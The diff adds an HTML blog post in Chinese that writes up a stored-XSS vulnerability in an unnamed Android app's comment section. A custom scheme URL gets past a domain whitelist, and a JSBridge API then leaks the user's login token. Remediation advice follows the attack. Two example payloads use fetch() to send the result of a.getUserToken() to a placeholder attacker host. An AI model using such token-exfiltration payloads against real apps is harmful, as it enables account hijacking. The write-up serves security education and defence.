@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>任意 Schema 协议调用导致的任意用户登录 | Zephyr</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Noto+Sans+SC:wght@300;400;500;700&display=swap" rel="stylesheet">
+<link rel="icon" type="image/svg+xml" href="/images/favicon.svg">
+<link rel="stylesheet" href="/css/style.css">
+<meta name="generator" content="Hexo 8.1.2"></head>
+<body>
+
+<canvas id="particles"></canvas>
+<div class="progress-bar" id="progressBar"></div>
+
+
+<nav class="top-nav" id="topNav">
+  <div class="nav-left">
+    <a href="/" class="nav-brand">Zephyr</a>
+    <a href="https://github.com/Zephyr1ng" class="nav-github" target="_blank" rel="noopener">
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0024 12c0-6.63-5.37-12-12-12z"/></svg>
+      GitHub
+    </a>
+  </div>
+  <ul class="nav-links">
+    
+      <li><a href="/">文章</a></li>
+    
+      <li><a href="/categories">分类</a></li>
+    
+      <li><a href="/archives">归档</a></li>
+    
+      <li><a href="/friends">友链</a></li>
+    
+      <li><a href="/about">关于</a></li>
+    
+  </ul>
+</nav>
+
+<div class="container">
+  <!-- Single post page -->
+<article class="post-full">
+  <header class="post-header">
+    <a href="/" class="back-link">← Home</a>
+    <h1 class="post-title">任意 Schema 协议调用导致的任意用户登录</h1>
+    <div class="post-meta">
+      <time datetime="2025-12-07">2025-12-07</time>
+      
+    </div>
+  </header>
+
+  <div class="post-content">
+    <blockquote>
+<p>本文迁移自博客园，原文链接：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Zephyr07/articles/19318488">https://www.cnblogs.com/Zephyr07/articles/19318488</a></p>
+</blockquote>
+<h2 id="📋-漏洞概述"><a href="#📋-漏洞概述" class="headerlink" title="📋 漏洞概述"></a>📋 漏洞概述</h2><p><strong>漏洞类型</strong>：存储型 XSS + JSBridge API 调用<br><strong>影响范围</strong>：Android App 小程序评论区<br><strong>危害等级</strong>：高危<br><strong>漏洞原理</strong>：通过构造 Schema 协议绕过域名白名单限制，利用 XSS 调用 JSBridge API 窃取用户 Token</p>
+<hr>
+<h2 id="🔍-技术背景"><a href="#🔍-技术背景" class="headerlink" title="🔍 技术背景"></a>🔍 技术背景</h2><h3 id="1-Schema-协议"><a href="#1-Schema-协议" class="headerlink" title="1. Schema 协议"></a>1. Schema 协议</h3><p><strong>定义</strong>：Schema 协议是 Android 中的一种页面内跳转协议，用于方便 App 内部的页面跳转。</p>
+<p><strong>特点</strong>：</p>
+<ul>
+<li>可以根据业务需求自定义协议名称</li>
+<li>格式：<code>协议名://路径</code></li>
+<li>示例：<code>a://xxx</code>、<code>b://xxx</code>、<code>myapp://page/home</code></li>
+</ul>
+<p><strong>作用</strong>：</p>
+<ul>
+<li>实现 App 内部页面跳转</li>
+<li>传递参数和数据</li>
+<li>调用特定功能模块</li>
+</ul>
+<h3 id="2-JSBridge（JavaScript-桥接）"><a href="#2-JSBridge（JavaScript-桥接）" class="headerlink" title="2. JSBridge（JavaScript 桥接）"></a>2. JSBridge（JavaScript 桥接）</h3><p><strong>定义</strong>：JSBridge 是连接 H5 页面和原生 App 代码的”翻译器”。</p>
+<p><strong>工作原理</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌─────────────┐         ┌──────────────┐         ┌─────────────┐</span><br><span class="line">│   H5 页面   │ ──────&gt; │   JSBridge   │ ──────&gt; │  原生代码   │</span><br><span class="line">│  (JavaScript)│         │   (翻译器)   │         │  (Android)  │</span><br><span class="line">└─────────────┘         └──────────────┘         └─────────────┘</span><br></pre></td></tr></table></figure>
+
+<p><strong>功能</strong>：</p>
+<ul>
+<li><strong>H5 → 原生</strong>：将 JavaScript 代码翻译成原生能理解的指令<ul>
+<li>示例：<code>window.bridge.getLocation()</code> → <code>callNative(&quot;getLocation&quot;)</code></li>
+</ul>
+</li>
+<li><strong>原生 → H5</strong>：将原生指令翻译成 JavaScript 可执行的代码<ul>
+<li>示例：<code>webView.evaluateJavaScript</code> → <code>window.onPaySuccess()</code></li>
+</ul>
+</li>
+</ul>
+<p><strong>常见用途</strong>：</p>
+<ul>
+<li>调用摄像头、相册</li>
+<li>获取位置信息</li>
+<li>调用支付功能</li>
+<li>获取用户信息、Token</li>
+<li>调用系统 API</li>
+</ul>
+<h3 id="3-WebView（网页视图）"><a href="#3-WebView（网页视图）" class="headerlink" title="3. WebView（网页视图）"></a>3. WebView（网页视图）</h3><p><strong>定义</strong>：WebView 是原生应用内置的一个类似浏览器的”小型浏览器”。</p>
+<p><strong>作用</strong>：</p>
+<ul>
+<li>在 App 中运行 H5 页面</li>
+<li>提供 JavaScript 执行环境</li>
+<li>JSBridge 必须依赖 WebView 才能工作</li>
+</ul>
+<p><strong>类比</strong>：</p>
+<ul>
+<li>如果把 JSBridge 理解为一个快递中转站</li>
+<li>那 WebView 就相当于一个小区用来放这个快递中转站</li>
+<li>否则快递中转站无法给小区内的用户传递</li>
+</ul>
+<hr>
+<h2 id="🎯-漏洞发现过程"><a href="#🎯-漏洞发现过程" class="headerlink" title="🎯 漏洞发现过程"></a>🎯 漏洞发现过程</h2><h3 id="第一步：发现-WebView-接口"><a href="#第一步：发现-WebView-接口" class="headerlink" title="第一步：发现 WebView 接口"></a>第一步：发现 WebView 接口</h3><p><strong>发现点</strong>：发现 App 下的一个接口（假设为 <code>c</code> 接口）启用了应用自带的 WebView。</p>
+<p><strong>关键信息</strong>：</p>
+<ul>
+<li>接口启用了 WebView 渲染</li>
+<li>WebView 可以渲染 HTML 内容</li>
+</ul>
+<h3 id="第二步：发现-XSS-漏洞"><a href="#第二步：发现-XSS-漏洞" class="headerlink" title="第二步：发现 XSS 漏洞"></a>第二步：发现 XSS 漏洞</h3><p><strong>发现点</strong>：发现 <code>c</code> 接口下存在一个 <code>content</code> 参数可控且可被渲染。</p>
+<p><strong>漏洞特征</strong>：</p>
+<ul>
+<li><code>content</code> 参数用户可控</li>
+<li>内容直接渲染到 WebView 中</li>
+<li>未进行充分的 HTML 转义和过滤</li>
+</ul>
+<h3 id="第三步：逆向分析-JSBridge-API"><a href="#第三步：逆向分析-JSBridge-API" class="headerlink" title="第三步：逆向分析 JSBridge API"></a>第三步：逆向分析 JSBridge API</h3><p><strong>分析方法</strong>：通过 APK 逆向分析，发现 App 实现了一些暴露给 JavaScript 的 API。</p>
+<p><strong>发现的 API</strong>：</p>
+<ul>
+<li><code>a.getUserToken()</code> - 获取用户 Token</li>
+<li>可能还有其他敏感 API（如获取用户信息、位置等）</li>
+</ul>
+<h3 id="第四步：构造恶意-Payload"><a href="#第四步：构造恶意-Payload" class="headerlink" title="第四步：构造恶意 Payload"></a>第四步：构造恶意 Payload</h3><p><strong>Payload 构造</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a://xxx.公司域名.com/c?content=&lt;script&gt;fetch(&quot;http://恶意域名?token=&quot;+a.getUserToken())&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>Payload 分析</strong>：</p>
+<ol>
+<li><strong>Schema 协议</strong>：<code>a://xxx.公司域名.com</code> - 绕过白名单限制</li>
+<li><strong>XSS 注入</strong>：<code>&lt;script&gt;</code> 标签注入恶意代码</li>
+<li><strong>JSBridge 调用</strong>：<code>a.getUserToken()</code> 获取用户 Token</li>
+<li><strong>数据外传</strong>：通过 <code>fetch()</code> 将 Token 发送到恶意服务器</li>
+</ol>
+<hr>
+<h2 id="🔓-绕过白名单机制"><a href="#🔓-绕过白名单机制" class="headerlink" title="🔓 绕过白名单机制"></a>🔓 绕过白名单机制</h2><h3 id="白名单限制机制"><a href="#白名单限制机制" class="headerlink" title="白名单限制机制"></a>白名单限制机制</h3><p><strong>限制方式</strong>：App 的评论区对用户输入内容进行正则过滤，通过 <code>://xxx.公司域名.com</code> 来实现第三方域名白名单限制。</p>
+<p><strong>预期效果</strong>：只允许访问公司域名下的链接。</p>
+<h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3><p><strong>绕过原理</strong>：通过构造恶意的 Schema 协议头来实现组合利用。</p>
+<p><strong>示例</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">正常链接：https://xxx.公司域名.com/page</span><br><span class="line">恶意构造：a://xxx.公司域名.com/c?content=&lt;script&gt;...&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>为什么能绕过</strong>：</p>
+<ul>
+<li>正则匹配可能只检查了 <code>://</code> 后面的域名部分</li>
+<li>Schema 协议 <code>a://</code> 被误认为是合法的公司域名链接</li>
+<li>实际上 <code>a://</code> 是自定义协议，不是 HTTP&#x2F;HTTPS 协议</li>
+</ul>
+<hr>
+<h2 id="💥-攻击流程"><a href="#💥-攻击流程" class="headerlink" title="💥 攻击流程"></a>💥 攻击流程</h2><h3 id="完整攻击链"><a href="#完整攻击链" class="headerlink" title="完整攻击链"></a>完整攻击链</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">1. 攻击者构造恶意 Payload</span><br><span class="line">   ↓</span><br><span class="line">2. 在评论区发布包含恶意 Payload 的评论</span><br><span class="line">   ↓</span><br><span class="line">3. 评论以超链接形式展示</span><br><span class="line">   ↓</span><br><span class="line">4. 其他用户看到评论并点击链接</span><br><span class="line">   ↓</span><br><span class="line">5. App 打开 WebView 加载恶意内容</span><br><span class="line">   ↓</span><br><span class="line">6. XSS 代码执行，调用 JSBridge API</span><br><span class="line">   ↓</span><br><span class="line">7. 获取用户 Token 并发送到恶意服务器</span><br><span class="line">   ↓</span><br><span class="line">8. 攻击者获得 Token，实现任意用户登录</span><br></pre></td></tr></table></figure>
+
+<h3 id="攻击示例"><a href="#攻击示例" class="headerlink" title="攻击示例"></a>攻击示例</h3><p><strong>步骤 1：构造 Payload</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a://xxx.公司域名.com/c?content=&lt;script&gt;</span><br><span class="line">  fetch(&quot;http://evil.com/steal?token=&quot; + a.getUserToken())</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>步骤 2：发布评论</strong></p>
+<ul>
+<li>在评论区输入上述 Payload</li>
+<li>系统将其识别为超链接并展示</li>
+</ul>
+<p><strong>步骤 3：用户点击</strong></p>
+<ul>
+<li>用户看到评论中的链接</li>
+<li>点击后触发 Schema 协议跳转</li>
+</ul>
+<p><strong>步骤 4：执行攻击</strong></p>
+<ul>
+<li>WebView 加载恶意内容</li>
+<li>XSS 代码执行</li>
+<li>调用 <code>a.getUserToken()</code> 获取 Token</li>
+<li>通过 <code>fetch()</code> 发送到攻击者服务器</li>
+</ul>
+<p><strong>步骤 5：获取 Token</strong></p>
+<ul>
+<li>攻击者服务器收到 Token</li>
+<li>使用 Token 实现任意用户登录</li>
+</ul>
+<p><img src="/" alt="image"></p>
+<hr>
+<h2 id="🛡️-漏洞危害"><a href="#🛡️-漏洞危害" class="headerlink" title="🛡️ 漏洞危害"></a>🛡️ 漏洞危害</h2><h3 id="直接影响"><a href="#直接影响" class="headerlink" title="直接影响"></a>直接影响</h3><ol>
+<li><p><strong>用户 Token 泄露</strong></p>
+<ul>
+<li>攻击者可以获取任意用户的登录 Token</li>
+<li>实现任意用户账号登录</li>
+</ul>
+</li>
+<li><p><strong>用户隐私泄露</strong></p>
+<ul>
+<li>可能获取用户个人信息</li>
+<li>可能获取用户位置信息</li>
+<li>可能获取其他敏感数据</li>
+</ul>
+</li>
+<li><p><strong>账号劫持</strong></p>
+<ul>
+<li>攻击者可以使用泄露的 Token 登录用户账号</li>
+<li>进行恶意操作（如发布内容、修改信息等）</li>
+</ul>
+</li>
+</ol>
+<h3 id="潜在影响"><a href="#潜在影响" class="headerlink" title="潜在影响"></a>潜在影响</h3><ol>
+<li><p><strong>大规模数据泄露</strong></p>
+<ul>
+<li>如果漏洞被大规模利用，可能导致大量用户数据泄露</li>
+</ul>
+</li>
+<li><p><strong>业务安全风险</strong></p>
+<ul>
+<li>可能影响支付功能</li>
+<li>可能影响其他依赖 Token 的业务功能</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h2 id="🔧-修复建议"><a href="#🔧-修复建议" class="headerlink" title="🔧 修复建议"></a>🔧 修复建议</h2><h3 id="1-输入验证和过滤"><a href="#1-输入验证和过滤" class="headerlink" title="1. 输入验证和过滤"></a>1. 输入验证和过滤</h3><p><strong>建议</strong>：</p>
+<ul>
+<li>对所有用户输入进行严格的 HTML 转义</li>
+<li>使用白名单机制，只允许安全的 HTML 标签和属性</li>
+<li>过滤或转义 <code>&lt;script&gt;</code>、<code>onclick</code>、<code>onerror</code> 等危险内容</li>
+</ul>
+<p><strong>示例</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function sanitizeHTML(input) &#123;</span><br><span class="line">  // 转义 HTML 特殊字符</span><br><span class="line">  return input</span><br><span class="line">    .replace(/&amp;/g, &#x27;&amp;amp;&#x27;)</span><br><span class="line">    .replace(/&lt;/g, &#x27;&amp;lt;&#x27;)</span><br><span class="line">    .replace(/&gt;/g, &#x27;&amp;gt;&#x27;)</span><br><span class="line">    .replace(/&quot;/g, &#x27;&amp;quot;&#x27;)</span><br><span class="line">    .replace(/&#x27;/g, &#x27;&amp;#x27;&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-Content-Security-Policy-CSP"><a href="#2-Content-Security-Policy-CSP" class="headerlink" title="2. Content Security Policy (CSP)"></a>2. Content Security Policy (CSP)</h3><p><strong>建议</strong>：</p>
+<ul>
+<li>在 WebView 中实施严格的 CSP 策略</li>
+<li>禁止内联脚本执行</li>
+<li>限制外部资源加载</li>
+</ul>
+<p><strong>示例</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; </span><br><span class="line">      content=&quot;default-src &#x27;self&#x27;; script-src &#x27;none&#x27;;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-JSBridge-API-权限控制"><a href="#3-JSBridge-API-权限控制" class="headerlink" title="3. JSBridge API 权限控制"></a>3. JSBridge API 权限控制</h3><p><strong>建议</strong>：</p>
+<ul>
+<li>对敏感的 JSBridge API 进行权限验证</li>
+<li>限制哪些页面可以调用哪些 API</li>
+<li>对 API 调用进行来源验证</li>
+</ul>
+<p><strong>示例</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 只允许特定域名调用敏感 API</span><br><span class="line">if (window.location.origin !== &#x27;https://trusted-domain.com&#x27;) &#123;</span><br><span class="line">  throw new Error(&#x27;Unauthorized API call&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-Schema-协议白名单验证"><a href="#4-Schema-协议白名单验证" class="headerlink" title="4. Schema 协议白名单验证"></a>4. Schema 协议白名单验证</h3><p><strong>建议</strong>：</p>
+<ul>
+<li>严格验证 Schema 协议的合法性</li>
+<li>不仅检查域名，还要检查协议类型</li>
+<li>禁止在 Schema 协议中传递可执行代码</li>
+</ul>
+<p><strong>示例</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function validateSchema(url) &#123;</span><br><span class="line">  // 只允许特定的 Schema 协议</span><br><span class="line">  const allowedSchemes = [&#x27;https&#x27;, &#x27;http&#x27;];</span><br><span class="line">  const scheme = url.split(&#x27;://&#x27;)[0];</span><br><span class="line">  return allowedSchemes.includes(scheme);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-WebView-安全配置"><a href="#5-WebView-安全配置" class="headerlink" title="5. WebView 安全配置"></a>5. WebView 安全配置</h3><p><strong>建议</strong>：</p>
+<ul>
+<li>禁用 JavaScript（如果不需要）</li>
+<li>限制可以访问的域名</li>
+<li>使用安全的 WebView 配置</li>
+</ul>
+<p><strong>Android 示例</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">WebView webView = new WebView(context);</span><br><span class="line">WebSettings settings = webView.getSettings();</span><br><span class="line">settings.setJavaScriptEnabled(false); // 如果不需要 JS</span><br><span class="line">settings.setAllowFileAccess(false);</span><br><span class="line">settings.setAllowContentAccess(false);</span><br></pre></td></tr></table></figure>
+
+<h3 id="6-输出编码"><a href="#6-输出编码" class="headerlink" title="6. 输出编码"></a>6. 输出编码</h3><p><strong>建议</strong>：</p>
+<ul>
+<li>在渲染用户内容时进行 HTML 编码</li>
+<li>使用框架提供的安全渲染方法</li>
+<li>避免使用 <code>innerHTML</code>，使用 <code>textContent</code> 或安全的方法</li>
+</ul>
+<hr>
+<h2 id="📚-相关知识点总结"><a href="#📚-相关知识点总结" class="headerlink" title="📚 相关知识点总结"></a>📚 相关知识点总结</h2><h3 id="1-Schema-协议安全"><a href="#1-Schema-协议安全" class="headerlink" title="1. Schema 协议安全"></a>1. Schema 协议安全</h3><ul>
+<li>✅ 只允许特定的协议类型（如 <code>https://</code>、<code>http://</code>）</li>
+<li>✅ 验证协议和域名的合法性</li>
+<li>✅ 禁止在协议中传递可执行代码</li>
+</ul>
+<h3 id="2-JSBridge-安全"><a href="#2-JSBridge-安全" class="headerlink" title="2. JSBridge 安全"></a>2. JSBridge 安全</h3><ul>
+<li>✅ 最小权限原则：只暴露必要的 API</li>
+<li>✅ 权限验证：验证调用来源</li>
+<li>✅ 敏感 API 保护：对 Token、用户信息等 API 进行额外保护</li>
+</ul>
+<h3 id="3-WebView-安全"><a href="#3-WebView-安全" class="headerlink" title="3. WebView 安全"></a>3. WebView 安全</h3><ul>
+<li>✅ 禁用不必要的功能（如 JavaScript、文件访问）</li>
+<li>✅ 实施 CSP 策略</li>
+<li>✅ 限制可访问的域名</li>
+</ul>
+<h3 id="4-XSS-防护"><a href="#4-XSS-防护" class="headerlink" title="4. XSS 防护"></a>4. XSS 防护</h3><ul>
+<li>✅ 输入验证和过滤</li>
+<li>✅ 输出编码</li>
+<li>✅ 使用安全的渲染方法</li>
+<li>✅ 实施 CSP 策略</li>
+</ul>
+<hr>
+<h2 id="🎓-学习要点"><a href="#🎓-学习要点" class="headerlink" title="🎓 学习要点"></a>🎓 学习要点</h2><ol>
+<li><p><strong>理解 JSBridge 的工作原理</strong></p>
+<ul>
+<li>JSBridge 是 H5 和原生代码的桥梁</li>
+<li>必须依赖 WebView 才能工作</li>
+</ul>
+</li>
+<li><p><strong>理解 Schema 协议的作用和风险</strong></p>
+<ul>
+<li>Schema 协议用于 App 内部跳转</li>
+<li>可能被用于绕过安全限制</li>
+</ul>
+</li>
+<li><p><strong>理解 XSS 在移动端的危害</strong></p>
+<ul>
+<li>移动端 XSS 可以调用系统 API</li>
+<li>危害可能比 Web 端更大</li>
+</ul>
+</li>
+<li><p><strong>理解白名单绕过技巧</strong></p>
+<ul>
+<li>正则匹配可能存在绕过点</li>
+<li>需要全面验证，不能只检查部分内容</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h2 id="⚠️-免责声明"><a href="#⚠️-免责声明" class="headerlink" title="⚠️ 免责声明"></a>⚠️ 免责声明</h2><p>本文档仅用于安全研究和教育目的。未经授权的安全测试可能违法，请在获得明确授权的情况下进行安全测试。<br>如果漏洞的发现者偶然看到欢迎 + 我，抱紧大佬大腿~</p>
+
+  </div>
+
+  <!-- Donation Section -->
+  <div class="donation">
+    <div class="donation-divider">
+      <span>如果文章对你有帮助</span>
+    </div>
+    <p class="donation-hint">可以请我喝杯咖啡 ☕</p>
+    <div class="donation-qrs">
+      <div class="qr-card">
+        <img src="/images/alipay.jpg" alt="支付宝收款码" onerror="this.parentElement.style.display='none'">
+        <span>支付宝</span>
+      </div>
+      <div class="qr-card">
+        <img src="/images/wechat.jpg" alt="微信收款码" onerror="this.parentElement.style.display='none'">
+        <span>微信</span>
+      </div>
+    </div>
+  </div>
+
+  
+  <nav class="post-nav">
+    
+      <a href="/2026/01/09/PromptingAi-%E6%8F%90%E7%A4%BA%E8%AF%8D%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA/" class="prev">← PromptingAi（提示词注入靶场）</a>
+    
+    
+      <a href="/2025/12/05/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E5%88%A9%E7%94%A8%E5%90%8E%E7%AB%AF%E4%B8%8E-WAF-%E7%9A%84%E8%A7%A3%E6%9E%90%E5%B7%AE%E5%BC%82%E6%80%A7%E5%AE%9E%E7%8E%B0%E7%BB%95%E8%BF%87/" class="next">文件上传 - 利用后端与 WAF 的解析差异性实现绕过 →</a>
+    
+  </nav>
+  
+</article>
+
+</div>
+
+<script src="/js/main.js"></script>
+</body>
+</html>
